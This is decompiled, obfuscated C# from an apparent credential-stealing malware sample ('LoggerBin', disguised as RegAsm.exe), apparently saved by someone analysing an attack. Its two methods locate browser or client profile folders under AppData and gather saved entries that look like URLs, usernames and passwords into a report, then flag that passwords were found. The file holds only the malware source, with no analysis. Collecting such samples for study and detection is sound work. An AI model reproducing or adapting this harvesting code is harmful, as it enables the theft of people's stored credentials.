// Decompiled with JetBrains decompiler
// Type: o7.Ld
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using h4;
using rw;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using VW1;

namespace o7
{
  internal class Ld
  {
    internal static Ld oHe;

    public static string OWW()
    {
      string str1;
      try
      {
        if (Convert.ToBoolean(XWr.EnableBrowserRecovery))
        {
          string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), w4.bx(5686, w4.vY), w4.bx(5704, w4.vY), w4.bx(5722, w4.vY));
          if (Directory.Exists(path))
          {
            OZ oz = new OZ();
            StringBuilder stringBuilder = new StringBuilder();
            string str2 = path;
            zx3 txq = zx3.txq;
            foreach (NT nt in zx3.bx((object) oz, str2, txq))
            {
              stringBuilder.AppendLine(w4.bx(4656, w4.vY) + JC.bx((object) nt, JC.TU));
              stringBuilder.AppendLine(w4.bx(1176, w4.vY) + JC.bx((object) nt, JC.fa));
              stringBuilder.AppendLine(w4.bx(1200, w4.vY) + JC.bx((object) nt, JC.Mv));
              stringBuilder.AppendLine(w4.bx(5742, w4.vY));
              stringBuilder.AppendLine(w4.bx(1270, w4.vY));
            }
            if (string.IsNullOrWhiteSpace(stringBuilder.ToString()))
            {
              str1 = w4.bx(934, w4.vY);
              int num = 0;
              if (Ld.WHK() != null)
                goto label_8;
label_4:
              switch (num)
              {
                default:
                  goto label_2;
              }
label_8:
              num = 0;
              goto label_4;
            }
            else
            {
              XWr.IsPass = true;
              str1 = stringBuilder.ToString();
              goto label_2;
            }
          }
          else
          {
            str1 = w4.bx(686, w4.vY);
            goto label_2;
          }
        }
        else
        {
          str1 = w4.bx(666, w4.vY);
          goto label_2;
        }
      }
      catch
      {
      }
      return "";
label_2:
      return str1;
    }

    public static string xWC()
    {
      try
      {
        if (!Convert.ToBoolean(XWr.EnableBrowserRecovery))
          return w4.bx(666, w4.vY);
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), w4.bx(124, w4.vY), w4.bx(5722, w4.vY));
        if (!Directory.Exists(path))
          return w4.bx(686, w4.vY);
        OZ oz = new OZ();
        StringBuilder stringBuilder = new StringBuilder();
        string str = path;
        zx3 txq = zx3.txq;
        List<NT>.Enumerator enumerator = zx3.bx((object) oz, str, txq).GetEnumerator();
        int num1 = 0;
        if (!Ld.jHp())
          goto label_7;
label_3:
        switch (num1)
        {
          default:
            try
            {
              while (enumerator.MoveNext())
              {
                NT current = enumerator.Current;
                stringBuilder.AppendLine(w4.bx(1160, w4.vY) + JC.bx((object) current, JC.TU));
                stringBuilder.AppendLine(w4.bx(1176, w4.vY) + JC.bx((object) current, JC.fa));
                Ld.pHr((object) stringBuilder, (object) (w4.bx(1200, w4.vY) + JC.bx((object) current, JC.Mv)));
                stringBuilder.AppendLine(w4.bx(5786, w4.vY));
                stringBuilder.AppendLine(w4.bx(1270, w4.vY));
              }
            }
            finally
            {
              enumerator.Dispose();
            }
            if (string.IsNullOrWhiteSpace(stringBuilder.ToString()))
              return w4.bx(934, w4.vY);
            XWr.IsPass = true;
            return stringBuilder.ToString();
        }
label_7:
        int num2;
        num1 = num2;
        goto label_3;
      }
      catch
      {
      }
      return "";
    }

    public Ld()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool jHp() => Ld.oHe == null;

    internal static Ld WHK() => Ld.oHe;

    internal static object pHr([In] object obj0, [In] object obj1) => (object) ((StringBuilder) obj0).AppendLine((string) obj1);
  }
}
